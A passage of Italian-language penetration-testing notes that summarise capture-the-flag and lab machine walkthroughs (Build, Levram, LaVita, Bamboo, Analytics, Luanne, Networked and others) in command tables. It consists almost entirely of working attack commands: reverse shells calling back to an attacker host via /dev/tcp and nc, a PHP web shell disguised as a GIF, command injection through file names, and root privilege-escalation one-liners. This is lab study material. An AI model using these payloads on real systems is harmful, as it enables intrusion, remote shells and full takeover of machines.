| **Pspy**            | 1. `echo -e "#! /bin/bash /bin/bash -i /dev/tcp/IP_KALI/LPORT 0>&1" > run-parts` | Eseguendo *pspy* notiamo che viene eseguito senza path assoluto il programma `run-parts`. Inserendo un reverse shell nel path presente nel PATH verr√† cercato prima l√¨ e lo eseguir√† come root         |

- [writeup](https://medium.com/@vivek-kumar/offensive-security-proving-grounds-walk-through-roquefort-e61052190965)

### Build

| üß† Azione                   | üíª Comando / Metodo                                                                                                                                                           | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **rsync**                   | 1. `rsync -av --list-only rsync://IP_TARGET/`<br>2. `rsync -av rsync://IP_TARGET/backups/jenkins.tar.gz .`                                                                    | Con una scansione troviamo la porta `873` aperta ove √® presente il servizio *rsync*. Utilizzando la *1.* vediamo i file presenti e con la *2.* li scarichiamo in locale                                                                                                                                                                                                                                                                                                                                                                          |
|                             | 1. `python3 jenkins_offline_decrypt.py jenkins_configuration/secrets/master.key jenkins_configuration/secrets/hudson.util.Secret jenkins_configuration/jobs/build/config.xml` | Una volta unzippato il file scaricato, abbiamo tutti i file di configurazione del servizio *Jenkins*.<br>Utilizziamo il tool [jenkins decrypt](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) per decifrare la password (passiamo tre file) proprio come nella *1.*                                                                                                                                                                                                                            |
| **Gitea 1.21 RCE**          | 1. `msfvenom -p cmd/unix/reverse_bash LHOST=IP_KALI LPORT=513 -f raw > reverse.sh`<br>2. `nc -lvnp 513`<br>3. ![[Pasted image 20250716181126.png]]                            | Sulla porta `3000` √® presente il servizio *Gitea 1.21.11* che non ha CVE associate, ma sulla sezione EXPLORE possiamo notare che viene avviato in automatico un file di nome jenkins.<br>Entrando come amministratore con le credenziali `buildadm:Git1234!` ottenute precedentemente, cambiamo il file in una reverse shell come nella *3.*                                                                                                                                                                                                     |
| **rhosts e PowerDNS Admin** | 1. *KALI* `./chisel server -p 8000 --reverse`<br>2. *TARGET* `/tmp/chisel client IP_KALI:8000 R:513:127.0.0.1:513`<br>3. *KALI* `rsh -l root 127.0.0.1`<br>                   | Dal file `/.dockerenv` ci rendiamo conto che siamo all'interno di un container. Nel file `/root/.rhosts` sono presenti gli hostname delle macchine che possono accedere alla porta `513`. <br>Poich√© √® presente il servizio *PowerDNS Admin* possiamo entrare con le credenziali trovate ed assegnare i DNS all'indirizzo ip della nostra macchina in modo da avere accesso alla porta `513` senza uso di credenziali.<br>Forwardiamo sia la `513` e la `9191` in locale con la *1.* e *2.* (ripetiamo per entrambe) e poi accediamo con la *3.* |


- [writeup](https://medium.com/@bericontraster/build-vulnlab-full-walkthrough-6fce76ea581e)

### Levram

| üß† Azione        | üíª Comando / Metodo                                                                                           | üìù Output / Scopo                                                                                                                                                                                                                                                                                  |
| ---------------- | ------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Gerapy 0.9.7** | 1. `python3 50640.py -t IP_TARGET -p RPORT -L IP_KALI -P LPORT`                                               | Notiamo il servizio *Gerapy 0.9.7* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/50640). Scarichiamo il tool, entriamo con le credenziali di default `admin:admin` dopodich√© andiamo sulla voce `project` e creiamo un progetto nuovo. Adesso possiamo avviare con la *1.* il tool |
| **Capabilities** | 1. `getcap -r / 2>/dev/null`<br>2. `/usr/bin/python3.10 -c "import os; os.setuid(0); os.system('/bin/bash')"` | Notiamo con la *1.* che tra i file con capabilities attive √® presente `python3.10` dunque possiamo usarlo per privileges escalation, aiutandoci con il seguente [articolo](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)                                          |

### LaVita

| üß† Azione         | üíª Comando / Metodo                                                                                                                                                                      | üìù Output / Scopo                                                                                                                                                                                                                                                         |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Laravel 8.4.0** | 1. `wget https://raw.githubusercontent.com/knqyf263/CVE-2021-3129/refs/heads/main/attacker/exploit.py`<br>2. `Exploit("http://IP_KALI:LPORT", "/usr/bin/nc IP_KALI LPORT -e /bin/bash")` | Navigando sul sito troviamo che espone il servizio *Laravel 8.4.0* che √® vulnerabile a [RCE](https://raw.githubusercontent.com/knqyf263/CVE-2021-3129/refs/heads/main/attacker/exploit.py). Scarichiamo con la *1.* e poi modifichiamo la riga 103 nel main come nel *2.* |
| **pspy64s**       | 1. `echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc IP_KALI LPORT>/tmp/f'); ?>" > artisan`<br>2 `sudo su`                                                    | Installiamo *pspy64s* sulla macchina e notiamo che l'utente `skunk` esegue un file che controlliamo `.php`. Inseriamo la reverse shell di pentestmonkey. Adesso applichiamo la *2.* per diventare root                                                                    |

### Zeno

| üß† Azione                            | üíª Comando / Metodo                                                                  | üìù Output / Scopo                                                                                                                                                                                                                                               |
| ------------------------------------ | ------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Restaurant Management System 1.0** | 1. `python3 47520.py http://IP_TARGET:RPORT/rms/`                                    | Navigando su `/rms` notiamo il servizio *Restaurant Management System 1.0* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/47520) e poi navighiamo `/rms/images/reverse-shell.php?cmd=`                                                           |
| **DB Credentials**                   | 1. `mysql -u root -p`<br>2. `john --wordlists=/usr/share/wordlists/rockyou.txt hash` | Troviamo il file `config.php` con le credenziali del DB. Entriamo poi con la *1.* nel DB e con la *2.* otteniamo le credenziali degli altri utenti e diventiamo utente `edward`                                                                                 |
| **Reboot machine**                   | 1. `sudo -l`<br>2. `/usr/bin/chmod +s /bin/bash`                                     | Linpeas mostra che  abbiamo i privilegi come utente `/etc/systemd/system/zeno-monitoring.service`. Con la *1.* notiamo che possiamo rivviare il pc `reboot` con privilegi root.<br><br>Inseriamo la *2.* nel file `/etc/systemd/system/zeno-monitoring.service` |

- [writeup](https://unencrypted.vercel.app/blog/zeno-tryhackme)

### Vmdak

| üß† Azione               | üíª Comando / Metodo                                                                                                                                                                                        | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Default Credentials** | 1. `python3 47520.py http://IP_TARGET:RPORT/rms/`                                                                                                                                                          | Navigando intorno troviamo il servizio *Prison Management System* ed possibile accedervi con le credenziali di default `admin:admin123`                                                                                                                                                                                                                                                                                                                                                              |
| **File Upload**         | 1. `hexeditor -b rev.php`<br>2. `CTRL + A`<br>3. `89 50 4E 47`<br>4. `Content-Type: image/png`                                                                                                             | Andiamo in EDIT PROFILE e notiamo che possiamo caricare solo immagini in formato `.png`.<br>Utilizziamo la *1.* per cambiare il Magic Number della reverse shell di pentestmonkey in quelli png.√π Infine quando carichiamo cmabiamo il MIME Type come nella *4.*<br><br>NB: l'estensione deve rimanere `.php` altrimenti non la eseguir√†                                                                                                                                                             |
| **Credentials Reused**  |                                                                                                                                                                                                            | Utilizziamo le credenziali `vmdak:RonnyCache001` trovati in LEAVE MANAGEMENT sul pannello admin del servizio *Prison Management System* per fare privileges escalation                                                                                                                                                                                                                                                                                                                               |
| **Jenkins 2.401.2**     | 1. `ssh -LLPORT:127.0.0.1:8080 -oKexAlgorithms=+diffie-hellman-group1-sha1 vmdak@vmdak.local`<br>2. `pythohn3 jenkins_fileread.py -u http://localhost:4444 -f /root/.jenkins/secrets/initialAdminPassword` | Tra le porte aperte della macchina target notiamo la `8080`, utilizziamo la *1.* per forwardarla in locale. <br><br>Navigando la porta in locale troviamo il servizio *Jenkins 2.401.2* che √® vulnerabile a [LFI](https://github.com/godylockz/CVE-2024-23897?source=post_page-----9c8a2bc4960a---------------------------------------), utilizziamo la *2.* per leggere il file contenente le credenziali al servizio ed il proof.txt (possiamo farlo perch√© abbiamo accesso alla cartella `/root`) |


- [writeup](https://medium.com/@basha5969/vmdak-proving-grounds-9c8a2bc4960a) 

### BBScute

| üß† Azione           | üíª Comando / Metodo                                                                                   | üìù Output / Scopo                                                                                                                                                                                                                                                                                                    |
| ------------------- | ----------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CuteNews 2.1..2** | 1. `python3 exploit.py`<br>2.`http://IP_TARGET`<br>3. `bash -c 'bash -i >& /dev/tcp/IP_KALI/80 0>&1'` | Identifichiamo il CMS `CuteNews 2.1.2` che √® vulnearabile a [RCE](https://www.exploit-db.com/exploits/48800) . Scarichiamo il file dal link di prima, camciamo la webroot ed eseguiamo la *1.* infine indichiamo il dominio con la *2.* Ora abbiamo l'accesso come `www-data` dunque eseguiamo la reverse shell *3.* |
| **SUID**            | 1. `/usr/bin/hping3`<br>2. `/bin/sh -p`                                                               | Tra i file SUID √® presente `hping3` che √® vulnerabile a [GTFObins](https://gtfobins.github.io/gtfobins/hping3/#suid). Utilizziamo la *1.* e la *2.* per diventare root                                                                                                                                               |


- [writeup](https://medium.com/@tipstosecure/bbscute-lab-proving-ground-offsec-4e255c9263fb)


### Bamboo

| üß† Azione                 | üíª Comando / Metodo                                                                                                                                                                                 | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Bamboo Squid Proxy**    | 1. ![[Pasted image 20250719161822.png]]<br>2. ![[Pasted image 20250719162010.png]]                                                                                                                  | Sulla porta `3128` troviamo il servizio *Bamboo Squid Proxy* che serve a permettere l'accesso ad alcuni servizi interni della rete, solo alle persone che vengono proxate tramite esso.<br>Per poter effettuare l'accesso configuriamo *FoxyProxy* come nella *1.* e modifichiamo il file `/etc/proxychains.conf` come nella *2.* inserendo target e porta su cui √® presen                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| **Scanner**               | 1. `python3 squidscan.py --proxy http://IP_TARGET:3128`                                                                                                                                             | Con lo scanner [SquidProxyScanner](https://github.com/bobbuilder123/SquidProxyScanner) e la *1.* troviamo le porte attive che precedenmente non potevamo visitare                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| **PaperCut NG**           | 1. `proxychains4 python3 CVE-2023-27350.py --url http://IP_TARGET:9191 -c "wget http://IP_KALI/rev.sh"`<br>2. `proxychains4 python3 CVE-2023-27350.py --url http://IP_TARGET:9191 -c "bash rev.sh"` | Sulla porta `9191` troviamo il servizio *PaperCut NG* che √® vulnerabile a [RCE](https://github.com/horizon3ai/CVE-2023-27350). Utilizziamo la *1.* per es                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| **Interface PaperCut NG** | 1. `echo "cp /bin/bash /tmp/bashsuid && chmod u+s /tmp/bashsuid" > server-command`<br>2. `./bashsuid -p`<br>                                                                                        | Sulla cartella `/home/papercut/server` troviamo tutti i file utilizzati dal servizio *PaperCut NG*, magari uno di questi √® avviato dal root. Utilizziamo con la *1.* `pspy64s` sulla macchina target e lasciamolo in ascolto.<br>Navighiamo `http://IP_TARGET:9191/app?service=page/SetupCompleted` per bypassare l'autenticazione (come ci dice la vulnerabilit√† precedente [RCE](https://github.com/horizon3ai/CVE-2023-27350)) ed andiamo in ENABLE PRINTING=>NEXT=>START...PRINTERS=>REFRESH SERVERS e possiamo notare che su `pspy6s` appare un servizio scrivibile dall'utente attuale e processato dal root: `CMD: UID=0 \| /home/papercut/server/bin/linux-x64/server-command get-config health.api.key`<br>Utilizziamo la *1.*, premiamo nuovamente REFRESH SERVERS ed adesso usiamo la *2.* per diventare root |


- [writeup](https://adminions.ca/books/vulnlab-machines-chains/page/machine-medium-bamboo)


### Analytics

| **üß† Azione**          | **üíª Comando / Metodo**                                                                                                                                                                                                                                                                                                                    | **üìù Output / Scopo**                                                                                                                                                                                         |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Metabase**           | 1. `python3 exploit.py --rhost http://data.analytical.htb --lhost IP_KALI --lport LPORT`                                                                                                                                                                                                                                                   | Nel sottodominio `data.analytical.htb` troviamo il servizio *Metabase* che √® vulnerabile a [CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646). Utilizziamo la *1.* per avviare una reverse shell |
| **Credentials Reused** | 1. `env`                                                                                                                                                                                                                                                                                                                                   | Per vedere le variabili d'ambiente utilizziamo la *1.* e troviamo le credenziali usate dal servizio `metalytics:An4lytics_ds20220#`. Utilizzando le stesse credenziali riusciamo ad entrare tramite SSH       |
| **Linux Exploit**      | 1. `unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'` | La versione `Ubuntu 22.04 6.2.0-25` √® vulnerabile a [kernel exploitation](https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability?ref=benheater.com). Utilizziamo la *1.* per diventare root                   |


- [writeup](https://benheater.com/hackthebox-analytics/)

### UpDown

| **üß† Azione**             | **üíª Comando / Metodo**                                                                                                                                   | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                     |
| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Git**                   | 1. `python3 git_dumper.py -u URL dump`                                                                                                                    | Con un fuzzing directories troviamo la cartella `/.git` che con la *1.* scarichiamo tutta in locale                                                                                                                                                                                                                                                                       |
| **Headers**               | 1. ![[Pasted image 20250815225711.png]]<br>2. ![[Pasted image 20250815225718.png]]                                                                        | Controllando i file scaricati scopriamo che √® possibile accedere al sottodominio `dev.siteisup.htb` solo se si utilizza un Header del tipo `Special-Dev: only4dev`(guardare la *1.*). Dunque aggiungiamolo al nostro tool [Modify Header Value](https://chromewebstore.google.com/detail/modify-header-value-http/cbdibdfhahmknbkkojljfncpnhmacdek?hl=it) come nella *2.* |
| **Bypass PHP limite**     | 1. ![[Pasted image 20250815230011.png]]<br>2. `zip test.any test.php`<br>3. ![[Pasted image 20250815230119.png]]                                          | Controllando gli altri file scaricati notiamo su `checker.php` che non accetta nessuno dei formati PHP pertanto rende difficile l'esecuzione di reverse shell (guardare la *1.*). Ma possiamo caricare il file in formato diverso da php zippando con la *2.* e poi richiamarlo con il wrapper `phar://` come nella *3.* per bypassare questo ostacolo                    |
| **dfunc-bypasser**        | 1. ```python2 dfunc-bypasser.py --url http://dev.siteisup.htb/?page=phar://uploads/215f3a95022425a7ec914eccde6afb92/revone.0xdf/revone```                 | Poich√© molte funzioni sono disabilitate dobbiamo utilizzare [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) per bypassare questa restrizione. Usiamolo come nella *1.*.<br><br>NB: carichiamo come reverse shell [questa](https://www.php.net/manual/en/function.proc-open.php) poich√© utilizza la funzione `proc-open()` che non √® ristretta                |
| **Code Injection Python** | 1. `__import__('os').system('bash')`<br>2. ![[Pasted image 20250815230710.png]]                                                                           | Una volta dentro notiamo che l'utente `developer` esegue lo script in python `siteisup`. E' vulnerabile a *Code Injection* dunque avviamo una shell come nella *1* con                                                                                                                                                                                                    |
| **SUDO**                  | 1. `TF=$(mktemp -d)`<br>2. `echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py`<br>3. `easy_install $TF`<br> | Tra i permessi SUDO troviamo `easy_install` che √® vulnerabile secondo [GTOFBin](https://gtfobins.github.io/gtfobins/easy_install/). Eseguiamo la *1.*,*2.* e *3.* per diventare root                                                                                                                                                                                      |


- [writeup](https://medium.com/@mu.aktepe18/updown-walkthrough-htb-f4df868e0778)

## Command Injection

### Luane

| üß† Azione                       | üíª Comando / Metodo                                                                                                                                                                                                               | üìù Output / Scopo                                                                                                                                                                                       |
| ------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Enumerazione HTTP**           |                                                                                                                                                                                                                                   | Trovo `/robots.txt` con riferimento a `/weather`                                                                                                                                                        |
| **Fuzzing API meteo**           | 1. `curl 'http://10.129.147.195/weather/forecast?city=London'`<br>2. `curl 'http://10.129.147.195/weather/forecast?city=London')os.execute("cat /etc/passwd")--'`<br>3. `os.execute("bash -i >& /dev/tcp/10.10.14.XX/1234 0>&1")` | Ottengo errore `.lua` con percorso file. Tramite il [link](https://www.stackhawk.com/blog/lua-command-injection-examples-and-prevention/) capisco che posso usare `os.execute()` per command injection. |
| **Crack dell'hash**             | `john --wordlist=rockyou.txt luannehash`                                                                                                                                                                                          | Trovo delle credenziali in .htpasswd: `webapi_user:iamthebest`. Posso entrare nella porta 80                                                                                                            |
| **Enumerazione servizi locali** | `netstat -ant`                                                                                                                                                                                                                    | Scopro servizio interno su `127.0.0.1:3001`                                                                                                                                                             |
| **Accesso a file riservati**    | VITTIMA: `curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa`                                                                                                                                            | Con le credenziali posso accedere alla macchina passando per la porta 3001. Recupero chiave SSH privata di `r.michaels`                                                                                 |
| **Accesso SSH come r.michaels** | `chmod 600 id_rsa`<br>`ssh -i id_rsa r.michaels@10.129.147.195`                                                                                                                                                                   | Ottengo shell come `r.michaels`                                                                                                                                                                         |
| **Analisi backup**              | `ls -la backups/`                                                                                                                                                                                                                 | Trovo `devel_backup-2020-09-16.tar.gz.enc`                                                                                                                                                              |
| **Decriptazione backup**        | `netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/raj.tar.gz`<br>`tar -xf /tmp/raj.tar.gz`                                                                                                                       | Estrai contenuto del backup                                                                                                                                                                             |
| **Estrazione nuovo hash**       | `cat devel-2020-09-16/www/.htpasswd`                                                                                                                                                                                              | Trovo nuovo hash per `webapi_user`                                                                                                                                                                      |
| **Crack nuovo hash**            | `john --wordlist=rockyou.txt hash`                                                                                                                                                                                                | Password trovata: `littlebear`                                                                                                                                                                          |
| **Escalation a root**           | `doas su`<br>                                                                                                                                                                                                                     | Inserisco password: `littlebear` ed ottengo shell come root                                                                                                                                             |


### Haircut

| üß† Azione             | üíª Comando / Metodo                                                                                                   | üìù Output / Scopo                                                                                                                                                                                                                                          |
| --------------------- | --------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Gobuster**          | `gobuster dir -u http://IP_TARGET/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php -t 50` | Con GoBuster troviamo il percorso `/exposed.php` dove √® presente un campo d'input in cui possiamo richieste URL                                                                                                                                            |
| **Command Injection** | 1. `-o uploads/reverse_shell.php http://IP_KALI/reverse_shell.php`<br>2. `<?php echo system($_REQUEST['cmd']); ?>`    | Assumiamo che il campo utilizzi la funzione `system("curl")` dunque possiamo utilizzare i parametri di `curl` per indirizzare l'upload su una cartella di `/uploads` che abbiamo trovato il fuzzing directories *1.* La reverse shell utilizzata √® la *2.* |
| **Screen**            |                                                                                                                       | Sulla macchina √® presente `Screen 4.5.0` che secondo [exploit-db](https://www.exploit-db.com/exploits/41154) √® vulnerabile a privilege escalation                                                                                                          |


### Pelican

| üß† Azione           | üíª Comando / Metodo                                                                       | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                   |
| ------------------- | ----------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **ZooKeeper 3.4.6** | 1. `nc -lvnp 4444`<br>2. *In java.env script:* `$(/bin/nc -e /bin/sh IP_KALI 4444 &)`<br> | Vediamo che *ZooKeeper 3.4.6* √® vulnerabile a [Command Injection](https://www.exploit-db.com/exploits/48654)                                                                                                                                                                                                                        |
| **SUDO**            | 1. `sudo -l`<br>2. `ps -aux`<br>3. `sudo /usr/bin/gcore PID`                              | Vedendo con la *1.* i file SUDO noto che posso utilizzare il file `gcore` che secondo [GTFObins](https://gtfobins.github.io/gtfobins/gcore/#sudo) posso leggere qualsiasi processo. Utilizzo la *2.* per vedere i processi in corso e noto che root usa `/passwo` e con la *3.* ottengo un file con le credenziali dell'utente root |

### Hetemit

| üß† Azione             | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                  | üìù Output / Scopo                                                                                                                                                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Commnad Injection** | 1. `?code=os.system("id")`<br>2. `?code=os.system("nc IP_KALI 18000 -e /bin/bash")`<br>                                                                                                                                                                                                                              | Navigando sul web notiamo che il parametro `?code=` √® vulnerabile a *Command Injection* in linguaggio python *1.*. Allora applichiamo la *2.* per avviare una reverse shell                                                                              |
| **SUDO**              | 1. `sudo -l`<br>2. ```echo "[Unit]<br>Description=Reverse Shell Service<br>After=network.target<br>[Service]<br>Type=simple<br>ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP_KALI/50000 0>&1'<br>User=root<br>Restart=always<br>[Install]<br>WantedBy=multi-user.target" > /etc/systemd/system/pythonapp.service``` | `linpeas.sh` ci segnala che il file `/etc/systemd/system/pythonapp.service` che √® un file che viene eseguito all'avvio (inseriamo una reverse shell come nella *2.*); fortunatamente abbiamo i permessi SUDO per riavviare la macchina `/usr/bin/reboot` |
### Ultratech

| üß† Azione             | üíª Comando / Metodo                                                                                                                                                | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Commnad Injection** | 1. `wfuzz -u "http://IP_TARGET/ping?ip=FUZZwget+http://IP_KALI/ciaoFUZZ" -w "/usr/share/wordlists/SecLists-master/Fuzzing/special-chars + urlencoded.txt"`<br><br> | Controllando i commenti troviamo un riferimento a `/ping?ip=`. Inserendo qualche IP notiamo dalla risposta che utilizza il classico comando `ping` e questo suggerisce un *command injection*.<br><br>Utilizziamo la *1.* per fare fuzzing e vedere se tramite caratteri speciali troviamo una risposta diversa. Riceviamo un risposta sulla porta in ascolto, ci√≤ significa che il command  injection funziona |
| **Cracking**          | 1. `john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5`<br>                                                                                    | Nella cartella corrente √® presente il file `utech.db.sqlite` contenente gli hash degli utenti.<br>Utilizziamo la *1.* per craccarli                                                                                                                                                                                                                                                                             |
| **Docker group**      | 1. `docker images`<br>2. `docker run -v /:/mnt --rm -it DOCKER_IMAGE chroot /mnt sh`                                                                               | Una volta craccati gli hash riusciamo ad entrare come utente `r00t`. Enumerando scopriamo che l'utente appartiene al gruppo `docker` quindi possiamo applicare la *1.* per vedere se sono presenti container e la *2.* per montare l'intero filesysyem e navigarlo come root                                                                                                                                    |

- [writeup](https://infosecilluminati.medium.com/tryhackme-ultratech-walkthrough-60cf0fb4806b)


### Ochima

| üß† Azione         | üíª Comando / Metodo                                                                   | üìù Output / Scopo                                                                                                                                                                                                                                  |
| ----------------- | ------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **MalTrail 0.53** | 1. `nc -lvnp LPORT`<br>2. `./exploit.sh IP_KALI LPORT http://IP_TARGET/login`<br><br> | Sulla porta `8338` troviamo il servizio *MalTrail 0.53* . Il parametro username √® vulnerabile a [Command Injection](https://github.com/j4f3th/exploit_v0.53_maltrail).<br>Mettiamo una porta in ascolto con la *1.* ed avviamo il tool con la *2.* |
| **Pspy64s**       | 1. `echo -e "#!/bin/bash\nsh -i >& /dev/tcp/192.168.45.187/80 0>&1" > backup.sh`      | Scaricando `pspy64s` sulla macchina target ed avviandolo, notiamo che l'utente root in bg esegue il file `/opr/backup.sh`. Abbiamo i permessi di scrittura sul file quindi usiamo la *1.* per avviare una reverse shell                            |

### Busqueda

| üß† **Azione**                | üíª **Comando / Metodo**                                                                                                                        | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Flask and Searcher 2.4.0** |                                                                                                                                                | Sulla porta `80` √® presente il servizio *Flask and Searcher 2.4.0* che √® vulnerabile [CVE-2023-43364](https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303?source=post_page-----1d40d27a4a75---------------------------------------). Il servizio utilizza la funzione `eval()` che √® vulnerabile a *SSTI*                                                                                                                      |
| **Command Injection**        | 1. ![[Pasted image 20250817152454.png]]<br>2. ![[Pasted image 20250817152502.png]]                                                             | Avviamo una reverse shell con la *1.* e la *2.*                                                                                                                                                                                                                                                                                                                                                                                       |
| **Gitea**                    | 1. ![[Pasted image 20250817152902.png]]                                                                                                        | Una volta entrati notiamo che su `/var/www/app/.git` √® presente il file `config` che suggerisce il sottodominio  `gitea.searcher.htb` come nella *1.*.<br>All'interno dello stesso file troviamo la password `jh1usoih2bkjaspwe92`                                                                                                                                                                                                    |
| **SUDO**                     | 1. ![[Pasted image 20250817155454.png]]<br>2. `python3 /opt/scripts/system-checkup.py docker-inspect gitea`                                    | Controllando i file SUDO ed inserendo la password precedentemente trovata, scopriamo che l'utente pu√≤ utilizzare `/opt/scripts/system-checkup.py *`. Eseguendolo notiamo che possiamo eseguire la funzione `docker-inspect` *1.* che secondo la [documentazione]() possiamo ricavare informazioni di configurazione di un container. Applichiamolo su `gitea` come nella *2.* e ci ricaviamo le credenziali `mysql:yuiu1hoiu4i5ho1uh` |
| **Script**                   | 1. `echo -e '#!/bin/bash\n\ncp /bin/bash /tmp\nchmod 4777 /tmp' > full-checkup.sh`<br>2. `python3 /opt/scripts/system-checkup.py full-checkup` | Utilizzando le credenziali per entrare in `Gitea` notiamo che l'amminsitratore pu√≤ utilizzare 4 scripts del quale uno manca alla directory sulla macchina. Sostituiamo quello script mancante con la *1.* e *2.* per diventare root                                                                                                                                                                                                   |




- [writeup](https://0xdf.gitlab.io/2023/08/12/htb-busqueda.html)



## File Upload

### Networked

| üß† Azione                              | üíª Comando / Metodo                                                            | üìù Output / Scopo                                                                                                                                                                                                                    |
| -------------------------------------- | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Bypass upload**                      | <br><br>`GIF89a;<?php system(\$_GET['cmd']); ?>`                               | File accettato come immagine `.gif`, ma contiene codice PHP                                                                                                                                                                          |
| **Esecuzione comandi da remoto**       | `http://10.10.10.146/uploads/10_10_14_XX.gif?cmd=whoami`                       | Esecuzione remota di comandi tramite la shell PHP                                                                                                                                                                                    |
| **Scoperta script cron vulnerabile**   | Accesso come `www-data` ‚Üí osserva `/var/www/html/lib.php` e `check_attack.php` | Scoperta di `exec("rm -f $file")` con input non sanitizzato eseguito regolarmente da crontab                                                                                                                                         |
| **Exploit injection tramite filename** | 1. `touch ';nc -e /bin/bash 10.10.14.2 9002'` <br>2. `nc -lvpn 9001`           | Esecuzione comando da parte di `guly` di un file avente un nome che esegue una reve shell                                                                                                                                            |
| **Escalation a root**                  | 1. `sudo -l`<br>2. `/bin/bash`                                                 | Il file `changename.sh` √® eseguibile con i permessi root. Quando lo avvio avvio anche una shell secondo questa [vulnerabilit√†](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f) |
- [writeup](https://medium.com/@sam_0x0/networked-hackthebox-write-up-d6a10ded7bc7)
### Postman

| üß† Azione       | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                                                                                                          | üìù Output / Scopo                                                                                                                                                                                                               |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
